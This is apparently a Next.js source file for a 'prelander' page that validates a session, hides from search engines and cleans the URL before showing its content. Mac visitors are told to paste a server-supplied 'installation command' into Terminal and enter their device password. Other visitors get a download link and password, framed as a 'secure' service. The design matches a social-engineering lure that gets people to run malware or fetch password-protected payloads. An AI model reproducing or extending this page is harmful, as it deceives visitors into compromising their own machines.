/** Lightweight prelander page. Protected content is fetched only after server validation. */
import { SESSION_UNAVAILABLE_TITLE, SESSION_UNAVAILABLE_MESSAGE } from '@/lib/prelander-session';

export const dynamic = 'force-dynamic';

// Same policy the /d pages get (STEP 13): admin-authored full-HTML templates
// legitimately embed external scripts/styles/media, so https: stays open while
// object-src / frame-ancestors stay locked.
const PRELANDER_CSP =
  "default-src 'self'; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: blob: https:; font-src 'self' data: https:; connect-src 'self' https:; frame-src 'self' https:; media-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none';";

const SHELL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
<title>Download Ready</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantaveil, Cantarell, sans-serif; background: #f0f2f5; }
  .pl-wrap { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
  .pl-spin { width: 32px; height: 32px; border: 2px solid #e5e7eb; border-top-color: #1f2937; border-radius: 50%; animation: pl-rot 1s linear infinite; }
  .pl-msg { font-size: 14px; color: #6b7280; }
  @keyframes pl-rot { to { transform: rotate(360deg); } }
  .pl-card { width: 100%; max-width: 440px; background: #fff; border: 1px solid #e5e7eb; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,.08); overflow: hidden; }
  .pl-card.pl-mac-card { max-width: 640px; }
  .pl-head { padding: 32px 24px 20px; text-align: center; }
  .pl-ico { width: 56px; height: 56px; border-radius: 50%; background: #dcfce7; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
  .pl-ico.pl-ico-dark { background: #111827; }
  .pl-ico svg { width: 26px; height: 26px; }
  .pl-title { font-size: 20px; font-weight: 700; color: #111827; }
  .pl-sub { font-size: 14px; color: #6b7280; margin-top: 8px; }
  .pl-sec { padding: 0 24px 16px; }
  .pl-label { display: block; font-size: 12px; font-weight: 600; color: #6b7280; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 8px; }
  .pl-row { display: flex; align-items: center; gap: 8px; background: #f9fafb; border: 1px solid #e5e7eb; border-radius: 12px; padding: 4px; }
  .pl-row.pl-dark { background: #111827; border-color: #111827; }
  .pl-mono { flex: 1; min-width: 0; padding: 10px 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 14px; color: #374151; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; user-select: all; }
  .pl-dark .pl-cmd { color: #4ade80; }
  .pl-dollar { color: #9ca3af; margin-right: 6px; }
  .pl-btn { flex-shrink: 0; display: inline-flex; align-items: center; gap: 6px; border: 0; cursor: pointer; padding: 10px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; color: #fff; background: #111827; transition: background .15s; }
  .pl-btn:hover { background: #1f2937; }
  .pl-dark .pl-btn { background: #374151; }
  .pl-dark .pl-btn:hover { background: #4b5563; }
  .pl-btn.pl-done { background: #16a34a; }
  .pl-pw { display: flex; align-items: center; gap: 12px; background: #fffbeb; border: 1px solid #fde68a; border-radius: 12px; padding: 12px 16px; }
  .pl-pw svg { width: 16px; height: 16px; color: #f59e0b; flex-shrink: 0; }
  .pl-pw b { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 16px; letter-spacing: .1em; color: #92400e; user-select: all; }
  .pl-steps { padding: 0 24px 24px; }
  .pl-step { display: flex; gap: 12px; margin-bottom: 12px; }
  .pl-n { flex-shrink: 0; width: 28px; height: 28px; border-radius: 50%; background: #dcfce7; color: #15803d; font-size: 13px; font-weight: 700; display: flex; align-items: center; justify-content: center; }
  .pl-step p { font-size: 14px; color: #374151; padding-top: 4px; }
  .pl-video { margin: 0 24px 24px; }
  .pl-video .pl-vbox { position: relative; width: 100%; aspect-ratio: 16 / 9; background: #000; border-radius: 12px; overflow: hidden; }
  .pl-video video { width: 100%; height: 100%; }
  .pl-foot { text-align: center; font-size: 12px; color: #9ca3af; padding: 0 24px 24px; }
</style>
</head>
<body>
  <div class="pl-wrap" id="pl-loader">
    <div class="pl-spin"></div>
    <p class="pl-msg">Loading&hellip;</p>
  </div>
  <div id="pl-root" hidden></div>
  <script>
  ;(async function () {
    var d = document
    function stop () { var l = d.getElementById('pl-loader'); if (l && l.parentNode) l.parentNode.removeChild(l) }
    function deny () {
      stop()
      d.title = '${SESSION_UNAVAILABLE_TITLE}'
      var root = d.getElementById('pl-root')
      var heading = d.createElement('h1')
      var message = d.createElement('p')
      heading.textContent = '${SESSION_UNAVAILABLE_TITLE}'
      message.textContent = '${SESSION_UNAVAILABLE_MESSAGE}'
      root.replaceChildren(heading, message)
      root.className = 'pl-wrap'
      root.style.padding = '24px'
      root.style.textAlign = 'center'
      root.hidden = false
    }
    function esc (s) {
      return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]
      })
    }
    var ICONS = {
      down: '<svg viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>',
      term: '<svg viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>',
      lock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
      copy: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="14" height="14"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
      check: '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="14" height="14"><polyline points="20 6 9 17 4 11"/></svg>'
    }
    function btn (label) {
      return '<button class="pl-btn" type="button">' + ICONS.copy + '<span>' + esc(label) + '</span>' + ICONS.check.replace('#fff', '#fff') + '</button>'
    }
    function wire (root) {
      root.addEventListener('click', function (e) {
        var b = e.target && e.target.closest ? e.target.closest('.pl-btn') : null
        if (!b) return
        var txt = b.getAttribute('data-copy') || ''
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(txt).catch(function () {})
        }
        b.classList.add('pl-done')
        setTimeout(function () { b.classList.remove('pl-done') }, 2000)
      })
    }
    try {
      var res = await fetch('/api/prelander/resolve/session', {
        cache: 'no-store',
        credentials: 'same-origin',
        headers: { 'X-Prelander-Host': location.hostname }
      })
      // Handle both current denials and legacy empty responses during rollout.
      if (res.status === 204 || !res.ok) return deny()
      var data = await res.json()
      if (!data || !data.success) return deny()
      // CLEAN FINAL URL: bare root, no slug, no ids, no params.
      if (location.pathname !== '/' || location.search) {
        try { history.replaceState({}, '', '/') } catch (e) {}
      }
      // Admin full-HTML template → replace the whole document exactly as authored.
      if (data.rendered_html) { d.open(); d.write(data.rendered_html); d.close(); return }
      var root = d.getElementById('pl-root')
      var t = data.template || {}
      var isMac = data.os === 'mac'
      var url = data.offer_url || ''
      var pw = data.password || ''
      var out = ''
      if (isMac) {
        var steps = [
          'Copy the installation command above.',
          'Open the terminal and paste the command, then press "Return".',
          'Enter your device password and confirm the installation.'
        ]
        var stepHtml = ''
        for (var i = 0; i < steps.length; i++) {
          stepHtml += '<div class="pl-step"><div class="pl-n">' + (i + 1) + '</div><p>' + esc(steps[i]) + '</p></div>'
        }
        var videoHtml = ''
        if (t.show_video && (t.video_url || '/terminal.mp4')) {
          videoHtml = '<div class="pl-video"><div class="pl-vbox"><video controls playsinline autoplay muted loop preload="auto" src="' + esc(t.video_url || '/terminal.mp4') + '"></video></div></div>'
        }
        out = ''
        out += '<div class="pl-card pl-mac-card">'
        out += '<div class="pl-head"><div class="pl-ico pl-ico-dark">' + ICONS.term + '</div><h1 class="pl-title">' + esc(t.title || 'How to open Terminal on Mac') + '</h1></div>'
        out += '<div class="pl-sec"><label class="pl-label">Installation Command</label><div class="pl-row pl-dark pl-cmd-row"><div class="pl-mono pl-cmd"><span class="pl-dollar">$</span>' + esc(url) + '</div>' + btn(t.button_text || 'Copy').replace('class="pl-btn"', 'class="pl-btn" data-copy="' + esc(url) + '"') + '</div></div>'
        out += '<div class="pl-steps">' + stepHtml + '</div>'
        if (pw) {
          out += '<div class="pl-sec"><label class="pl-label">Device Password</label><div class="pl-pw">' + ICONS.down.replace('#16a34a', '#f59e0b') + '<b>' + esc(pw) + '</b></div></div>'
        }
        out += videoHtml
        out += '<p class="pl-foot">Secure installation service</p>'
        out += '</div>'
        root.innerHTML = out
      } else {
        var out2 = ''
        out2 += '<div class="pl-card">'
        out2 += '<div class="pl-head"><div class="pl-ico">' + ICONS.down + '</div><h1 class="pl-title">' + esc(t.title || 'Your file is ready to download') + '</h1>' + (t.subtitle ? '<p class="pl-sub">' + esc(t.subtitle) + '</p>' : '<p class="pl-sub">Your file is prepared. Copy the link to download.</p>') + '</div>'
        out2 += '<div class="pl-sec"><label class="pl-label">Download Link</label><div class="pl-row"><div class="pl-mono">' + esc(url) + '</div>' + btn(t.button_text || 'Copy').replace('class="pl-btn"', 'class="pl-btn" data-copy="' + esc(url) + '"') + '</div></div>'
        if (pw && (!t || t.show_password_field !== false)) {
          out2 += '<div class="pl-sec"><label class="pl-label">Password</label><div class="pl-pw">' + ICONS.down + '<b>' + esc(pw) + '</b></div></div>'
        }
        out2 += '<p class="pl-foot">Secure file hosting service</p>'
        out2 += '</div>'
        root.innerHTML = out2
      }
      root.hidden = false
      wire(root)
      stop()
    } catch (e) { deny() }
  })()
  </script>
</body>
</html>`;

export async function GET(): Promise<Response> {
  return new Response(SHELL_HTML, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      // Never cache the shell anywhere — every load re-validates the session.
      'Cache-Control': 'no-store, no-cache, must-revalidate, private',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'X-Robots-Tag': 'noindex, nofollow, noarchive, nosnippet',
      'Content-Security-Policy': PRELANDER_CSP,
    },
  });
}